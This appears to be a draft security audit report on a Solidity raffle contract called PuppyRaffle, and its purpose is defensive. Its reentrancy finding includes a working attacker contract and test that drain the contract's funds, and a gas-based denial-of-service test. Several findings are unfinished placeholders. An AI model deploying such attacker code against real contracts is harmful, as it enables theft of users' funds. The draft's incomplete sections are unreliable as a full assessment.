
### [H-1] Reentrancy attack vulnerability in the `PuppyRaffle::refund` function, allows for draining of all funds from contract.  

**Description:** 
 `PuppyRaffle::refund` updates the `PuppyRaffle::players` array _after_ refunding the user. It does not follow the Check-Effect-Inetraction structure, and as result allows for an external contract to repeatly call the refund function without the  `PuppyRaffle::players` array being updated; draining the contract of all funds. It is a classic reentrancy attack. 

 ```javascript
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

@>      payable(msg.sender).sendValue(entranceFee);
@>      players[playerIndex] = address(0);

        emit RaffleRefunded(playerAddress);
    }
 ```

 A player who has entered the raflle can use a `fallback` or `receive` function to call the `PuppyRaffle::refund` function again on receiving the first refund. They could continue doing so until all funds have been drained from the contract.   

**Impact:** 
All fees paid by raffle entrants are at risk of being stolen. 

**Proof of Concept:**

1. User enters the raffle. 
2. Attacker sets up a contract with a `fallback` funcion that calls `PuppyRaffle::refund`. 
3. Attacker enters the raffle. 
4. Attacker calls `PuppyRaffle::refund`, draining contract of funds. 

<details>
<summary> PoC </summary>

Place the dollowing in `PuppyRaffleTest.t.sol`: 

```javascript

    function test_reentrancyRefund() public {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle); 
        address attackUser = makeAddr("attackuser"); 
        vm.deal(attackUser, 1 ether);

        uint256 startReentrancyAttackerBalance = address(attackerContract).balance; 
        uint256 startPuppyRaffleBalance = address(puppyRaffle).balance; 

        vm.prank(attackUser); 
        attackerContract.attack{value: entranceFee}(); 

        uint256 endReentrancyAttackerBalance = address(attackerContract).balance; 
        uint256 endPuppyRaffleBalance = address(puppyRaffle).balance; 

        console.log("start attacker balance", startReentrancyAttackerBalance); 
        console.log("start puppyRaffle balance", startPuppyRaffleBalance); 

        console.log("end attacker balance", endReentrancyAttackerBalance); 
        console.log("end puppyRaffle balance", endPuppyRaffleBalance); 
    }
```

And also this contract:

```javascript

    contract ReentrancyAttacker {
        PuppyRaffle puppyRaffle;
        uint256 entranceFee; 
        uint256 attackerIndex; 

        constructor(PuppyRaffle  _puppyRaffle) {
            puppyRaffle = _puppyRaffle;
            entranceFee = puppyRaffle.entranceFee(); 
        }

        function attack() external payable {
            address[] memory players = new address[](1); 
            players[0] = address(this); 
            puppyRaffle.enterRaffle{value: entranceFee}(players);

            attackerIndex = puppyRaffle.getActivePlayerIndex(address(this)); 
            puppyRaffle.refund(attackerIndex); 
        }

        function _stealMoney() internal {
            if (address(puppyRaffle).balance >= entranceFee) {
                puppyRaffle.refund(attackerIndex); 
            }
        }

        receive() external payable {
            _stealMoney(); 
        }

        fallback() external payable {
            _stealMoney(); 
        }
    }
```

</details>

**Recommended Mitigation:** 
To prevent this, we should have the `PuppyRaffle::refund` function update the `PuppyRaffle::players` array before making an external call. Additionally, we have to move the event emission up as well.  

```diff

    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

-       payable(msg.sender).sendValue(entranceFee);
        players[playerIndex] = address(0);
        emit RaffleRefunded(playerAddress);
+       payable(msg.sender).sendValue(entranceFee);
    }

```



### [H-2] The `PuppyRaffle::selectWinner` is only pseudo random. It can easily be exploited to 
TODO 

**Description:** 

**Impact:** 

**Proof of Concept:**

**Recommended Mitigation:** 
Use of off-chain verified random number generator. Most popular one is Chainlink VRF. 

### [M-1] An unbound loop at `PuppyRaffle::enterRaffle` creates a possibility for a denial-of-service(DoS) attack, incrementing gas cost for future entrees. 

**Description:** The `PuppyRaffle::enterRaffle` loops through an array of players `players` to check for duplicates. The array `players` is unbound. As the length of `players` increases, the cost to enter the raffle for new players increases as a longer array needs to be checked for duplicates. As a result, early entrants pay little in gas fees, later entrants (much) more. 

```javascript 
// audit: dos attack 
@>  for (uint256 i = 0; i < players.length - 1; i++) {
      for (uint256 j = i + 1; j < players.length; j++) {
          require(players[i] != players[j], "PuppyRaffle: Duplicate player");
      }
  }
```

**Impact:** The gas costs for raffle entrants will increase as more players enter the raffle. This will discourage later players to enter; and causing a rush at the start. 

An Attacker might make the `players` array so long, that no-one else can enter and guaranteeing a win.  

**Proof of Concept:**
If we have two sets of a hundred players, gas cost is as follows: 
- gas used in first 100 players: 6 252 047
- gas used in second 100 players: 18 068 137

The second set pays more than three times as much as the first set fo players. 

<details>
<summary> PoS </summary>
Place the following code in `PuppyRaffleTest.t.sol`.

```javascript 
  function test_DenialOfService() public {
      vm.txGasPrice(1); 

      uint256 numberOfPlayers = 100; 
      address[] memory players = new address[](numberOfPlayers);
      for (uint160 i; i < numberOfPlayers; i++) {
          players[i] = address(i); 
      }
      uint256 gasStart = gasleft(); 
      puppyRaffle.enterRaffle{value: entranceFee * numberOfPlayers}(players);
      uint256 gasEnd = gasleft(); 

      uint256 gasUsed = (gasStart - gasEnd) * tx.gasprice; 
      console.log("gas used in first 100 players: ", gasUsed); 

      uint256 numberOfPlayersTwo = 100; 
      address[] memory playersTwo = new address[](numberOfPlayersTwo);
      for (uint160 i; i < numberOfPlayersTwo; i++) {
          playersTwo[i] = address(i + numberOfPlayers); 
      }
      uint256 gasStartTwo = gasleft(); 
      puppyRaffle.enterRaffle{value: entranceFee * numberOfPlayersTwo}(playersTwo);
      uint256 gasEndTwo = gasleft(); 

      uint256 gasUsedSecond = (gasStartTwo - gasEndTwo) * tx.gasprice; 
      console.log("gas used in second 100 players: ", gasUsedSecond); 
      
      assert(gasUsed < gasUsedSecond); 
  }
```
</details>

**Recommended Mitigation:** There a few recommendations. 

1. Consider allowing multiple addresses. 
2. Create a mapping. This would allow constant time look up if players has entered. 
3. NOTE to self: can insert a diff section so show how this can be done. 


### [M-1] The `PuppyRaffle::refund` does not allow player 0 to get refund.  
Or low severity? It does make the function unusuable for player 0...  

**Description:** 

**Impact:** 

**Proof of Concept:**

**Recommended Mitigation:** 

### [M-2] The totalFee state variable is subject to overflow issue at `PuppyRaffle::selectWinner`.  

**Description:** 

**Impact:** 

**Proof of Concept:**
See `PuppyRaffleTest.t.sol::test_overflowTotalFee` for a PoC. 
+ use bigger uint64. 

**Recommended Mitigation:** 
Newer version solc; or insert manual check.  


### [M-3] unsafe cast of uint256 to uint64 at `PuppyRaffle::selectWinner`.  

**Description:** 
fee = uint526  but totalFees is uint64 => unsafe casting. 

**Impact:** 

**Proof of Concept:**
See `PuppyRaffleTest.t.sol::test_overflowTotalFee` for a PoC. 
+ use bigger uint64. 

**Recommended Mitigation:** 
Newer version solc; or insert manual check.  


CONTINUE HERE 
### [L-1] `PuppyRaffle::getPlayerIndex` returns 0 for non-existent players, and for player 0. It might mean that player 0 might incorrectly think they have not entered the raffle. 

**Description:** 

**Impact:** 

**Proof of Concept:**

**Recommended Mitigation:** 


# Gas 

### [G-1] Unchanged state variables should be declared immutable. 

Reading from storage is much more expansive than reading from a constant or immutable variable. 

Instances:
-  `PuppyRaffleTest.t.sol::raffleDuration` should be `immutable`. 
-  `PuppyRaffleTest.t.sol::commonImageUri` should be `constant`. 
-  `PuppyRaffleTest.t.sol::rareImageUri` should be `constant`.
-  `PuppyRaffleTest.t.sol::legendaryImageUri` should be `constant`.
-  

### [G-2] Storage in a loop should be cached.

Reading from storage is gas expensive. Everytime you call players.length you read from storage. PlayersLength reads from memory which is mor egas efficient. 

```diff
+   uint256 playersLength = players.length;
-   for (uint256 i = 0; i < players.length - 1; i++) {
+   for (uint256 i = 0; i < playersLength - 1; i++) {
-           for (uint256 j = i + 1; j < players.length; j++) {
+           for (uint256 j = i + 1; j < playersLength; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
    }

```

# Informational 

### [I-1] Solidity pragma should be specific, not wide

Consider using a specific version of Solidity in your contracts instead of a wide version. For example, instead of `pragma solidity ^0.8.0;`, use `pragma solidity 0.8.0;`

- Found in src/PuppyRaffle.sol [Line: 2](src/PuppyRaffle.sol#L2)

	```solidity
	pragma solidity ^0.7.6;
	```

### [G-1] Unchanged state variables should be declared immutable. 

### [I-2] Using outdated version of Solidity is not recommended, 

`solc` frequently releases new compiler versions. 
Using an old version prevents access to new Solidity security checks. We also recommend avoiding complex pragma statement.
Deploy with a recent version of Solidity (at least 0.8.0) with no known severe issues.

**Recommended Mitigation:** 
Deploy with a recent version of Solidity (at least 0.8.0) with no known severe issues.
Use a simple pragma version that allows any of these versions. Consider using the latest version of Solidity for testing.

Please see slither documentation for more information. 

### [I-3] Missing checks for `address(0)` when assigning values to address state variables

Check for `address(0)` when assigning values to address state variables.

- Found in src/PuppyRaffle.sol [Line: 70](src/PuppyRaffle.sol#L70)

	```solidity
	        feeAddress = _feeAddress;
	```

- Found in src/PuppyRaffle.sol [Line: 209](src/PuppyRaffle.sol#L209)

	```solidity
	        feeAddress = newFeeAddress;
	```

